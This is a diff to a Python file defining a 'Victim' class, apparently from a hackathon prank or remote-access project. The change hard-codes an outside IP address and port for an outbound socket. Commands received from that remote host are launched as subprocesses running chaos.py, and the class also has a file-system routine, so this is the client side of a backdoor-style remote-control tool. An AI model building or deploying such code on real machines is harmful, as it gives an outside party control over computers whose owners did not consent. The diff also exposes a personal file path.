@@ -1,11 +1,11 @@
 import socket
-import time
-import subprocess
 import os
+import subprocess
+import time
 
 class Victim():
     def __init__(self):
-        self.host = ""
+        self.host = "18.216.151.152"
         self.port = 5588
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -63,8 +63,9 @@ class Victim():
         current_directory = os.getcwd()
         os.chdir("/Users/gary.szekely/Desktop/Personal Repositories/HackUMassIX/Chaos")
         command = self.sock.recv(1024).decode()
-        args = command.split(" ")
-        subprocess.Popen(["python3", "chaos.py"] + args)
+        if command != "Quit":
+            args = command.split(" ")
+            subprocess.Popen(["python3", "chaos.py"] + args)
         os.chdir(current_directory)
     
     def file_system(self):
@@ -119,7 +120,6 @@ class Victim():
                     break
             except:
                 pass
-
 
 if __name__ == "__main__":
     while True:
